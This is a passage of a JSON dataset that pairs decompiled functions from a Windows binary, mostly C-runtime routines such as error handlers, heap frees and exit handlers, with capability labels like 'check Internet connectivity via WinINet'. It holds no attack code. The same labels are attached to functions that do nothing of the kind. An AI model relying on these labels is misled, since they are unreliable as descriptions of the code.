        "decompiled_code": "\nvoid fcn.00415f30(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t *unaff_ESI;\n    uint *puVar8;\n    int32_t iStack12;\n    uchar uStack4;\n    \n    bVar3 = true;\n    puVar4 = (**unaff_ESI[1])();\n    unaff_ESI[99] = puVar4;\n    *puVar4 = 0x4156c0;\n    puVar4[1] = 0x415720;\n    *(puVar4 + 2) = 0;\n    if (*(unaff_ESI + 0xd3) != '\\0') {\n        *(*unaff_ESI + 0x14) = 0x1a;\n        (***unaff_ESI)();\n    }\n    iStack12 = 0;\n    if (0 < unaff_ESI[0x13]) {\n        piVar7 = unaff_ESI[0x15] + 8;\n        puVar8 = puVar4 + 3;\n        do {\n            iVar5 = (piVar7[7] * *piVar7) / unaff_ESI[0x41];\n            iVar1 = unaff_ESI[0x40];\n            iVar6 = (piVar7[8] * piVar7[1]) / unaff_ESI[0x42];\n            iVar2 = unaff_ESI[0x3f];\n            puVar8[10] = iVar6;\n            if ((iVar2 == iVar5) && (iVar1 == iVar6)) {\n                if (unaff_ESI[0x36] == 0) {\n                    *puVar8 = 0x415930;\n                }\n                else {\n                    *puVar8 = 0x415db0;\n                    *(puVar4 + 2) = 1;\n                }\n            }\n            else if (iVar2 == iVar5 * 2) {\n                if (iVar1 == iVar6) {\n                    bVar3 = false;\n                    *puVar8 = 0x4159a0;\n                }\n                else {\n                    if ((iVar2 != iVar5 * 2) || (iVar1 != iVar6 * 2)) goto code_r0x0041604a;\n                    if (unaff_ESI[0x36] == 0) {\n                        *puVar8 = 0x415a50;\n                    }\n                    else {\n                        *puVar8 = 0x415b20;\n                        *(puVar4 + 2) = 1;\n                    }\n                }\n            }\n            else {\ncode_r0x0041604a:\n                if ((iVar2 % iVar5 == 0) && (iVar1 % iVar6 == 0)) {\n                    bVar3 = false;\n                    uStack4 = iVar2 / iVar5;\n                    *puVar8 = 0x4157b0;\n                    *(puVar4 + iStack12 + 0x5c) = uStack4;\n                    *(puVar4 + iStack12 + 0x66) = iVar1 / iVar6;\n                }\n                else {\n                    *(*unaff_ESI + 0x14) = 0x27;\n                    (***unaff_ESI)();\n                }\n            }\n            piVar7 = piVar7 + 0x16;\n            iStack12 = iStack12 + 1;\n            puVar8 = puVar8 + 1;\n        } while (iStack12 < unaff_ESI[0x13]);\n    }\n    if ((unaff_ESI[0x36] != 0) && (!bVar3)) {\n        *(*unaff_ESI + 0x14) = 0x65;\n        (**(*unaff_ESI + 4))();\n    }\n    return;\n}\n",
        "token_count": 859
    },
    "0042089f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042089f(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = arg_ch & 4;\n    uVar2 = arg_ch & 0x80;\n    uVar1 = 1;\n    if ((arg_ch & 0x40) != 0) {\n        arg_ch = arg_ch | 1;\n    }\n    if ((arg_ch & 8) != 0) {\n        arg_ch = arg_ch | 2;\n    }\n    iVar4 = 0;\n    do {\n        if (uVar1 == (arg_ch & 0xffffff3b)) break;\n        uVar1 = *(iVar4 * 4 + 0x4394b4);\n        iVar4 = iVar4 + 1;\n    } while (uVar1 != 0);\n    if (*(iVar4 * 4 + 0x4394b0) != 0) {\n        if (((uVar2 == 0) || ((arg_ch & 10) == 0)) || (arg_8h_00 = fcn.004207d8(arg_8h, 0, arg_10h),  arg_8h_00 == 0)) {\n            arg_8h_00 = fcn.004207d8(arg_8h, iVar4, arg_10h);\n            if (arg_8h_00 == 0) {\n                return 0;\n            }\n            if (uVar3 == 0) {\n                return arg_8h_00;\n            }\n            iVar4 = fcn.004225bb(arg_8h_00, 0, 2);\n            if (iVar4 == 0) {\n                return arg_8h_00;\n            }\n        }\n        fcn.004226f5(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 456
    },
    "00420bc6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420bc6(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x441480) {\n        return;\n    }\n    *0x443e38 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x443e3c = &arg_8h;\n    *0x443d78 = 0x10001;\n    *0x443d20 = 0xc0000409;\n    *0x443d24 = 1;\n    var_328h = *0x441480;\n    var_324h = *0x441484;\n    *0x443d2c = unaff_retaddr;\n    *0x443e04 = in_GS;\n    *0x443e08 = in_FS;\n    *0x443e0c = in_ES;\n    *0x443e10 = in_DS;\n    *0x443e14 = unaff_EDI;\n    *0x443e18 = unaff_ESI;\n    *0x443e1c = unaff_EBX;\n    *0x443e20 = in_EDX;\n    *0x443e24 = in_ECX;\n    *0x443e28 = in_EAX;\n    *0x443e2c = unaff_EBP;\n    *0x443e30 = unaff_retaddr;\n    *0x443e34 = in_CS;\n    *0x443e40 = in_SS;\n    *0x443d70 = (*_sym.imp.KERNEL32.DLL_IsDebuggerPresent)();\n    fcn.00431d9c(1);\n    (*_sym.imp.KERNEL32.DLL_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.DLL_UnhandledExceptionFilter)(0x439f00);\n    if (*0x443d70 == 0) {\n        fcn.00431d9c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.DLL_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.DLL_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 835
    },
    "004214f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004214f1(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.DLL_HeapFree)(*0x4441a8, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00426e0a();\n            uVar3 = (*_sym.imp.KERNEL32.DLL_GetLastError)();\n            uVar3 = fcn.00426dc8(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00421076": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421076(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.004214f1(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 81
    },
    "00423137": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0042323d: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00423242)\n// WARNING: Removing unreachable block (ram,0x00423271)\n// WARNING: Removing unreachable block (ram,0x00423248)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00423137(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f1f0, 0x20);\n    fcn.0042766f(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.DLL_DecodePointer;\n    if (*0x443cfc != 1) {\n        *0x443cf8 = 1;\n        *0x443cf4 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.DLL_DecodePointer)(*0x444c90);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x444c8c);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00426e53();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00426e53();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x444c90);\n                        piVar2 = (*pcVar1)(*0x444c8c);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x439340;\n            while (*(unaff_EBP + -0x1c) < 0x43934c) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x439350;\n        while (*(unaff_EBP + -0x20) < 0x439354) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00427596(8);\n    }\n    return;\n}\n",
        "token_count": 1013
    },
    "004242c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004242c3(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x42436e;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0042439a;\n        uStack36 = *0x441480 ^ &fcn.004242c3::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004242c3::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00427003();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.004242c3::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 721
    },
    "0042c854": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042c854(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00427596(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0042de3f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042de3f(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00427003();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00427003();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0042e106": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e106(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004244ff(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00427003();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00427003();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.004244d8(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0042de9e(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "00433a01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00433a01(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00426e53();\n    var_14h = 0;\n    if (*0x444984 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.DLL_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.DLL_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.DLL_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.DLL_EncodePointer,  iVar2 == 0)) goto code_r0x00433b5e;\n        *0x444984 = (*_sym.imp.KERNEL32.DLL_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x444988 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x44498c = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x444994 = (*pcVar4)(uVar3);\n        if (*0x444994 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x444990 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.DLL_DecodePointer;\n    if ((*0x444990 == var_18h) || (*0x444994 == var_18h)) {\ncode_r0x00433b0d:\n        if ((((*0x444988 != var_18h) && (pcVar4 = (*pcVar6)(*0x444988),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x44498c != var_18h && (pcVar4 = (*pcVar6)(*0x44498c),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.DLL_DecodePointer)(*0x444990);\n        pcVar5 = (*pcVar6)(*0x444994);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00433b0d;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x444984);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x00433b5e:\n    fcn.00420bc6(unaff_EBX);\n    return;\n}\n",
        "token_count": 925
    },
    "004345b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.004345b4(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x004346f8;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x004346ff;\ncode_r0x004346f8:\n                        do {\n                            bVar6 = true;\ncode_r0x004346ff:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043470d;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043470d:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x44228c - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x44228c < iVar14) {\n                if (iVar14 < *0x442288) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x442288;\n                }\n                goto code_r0x00434ab8;\n            }\n            iVar13 = *0x44228c - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x004348ac;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x004348ac:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                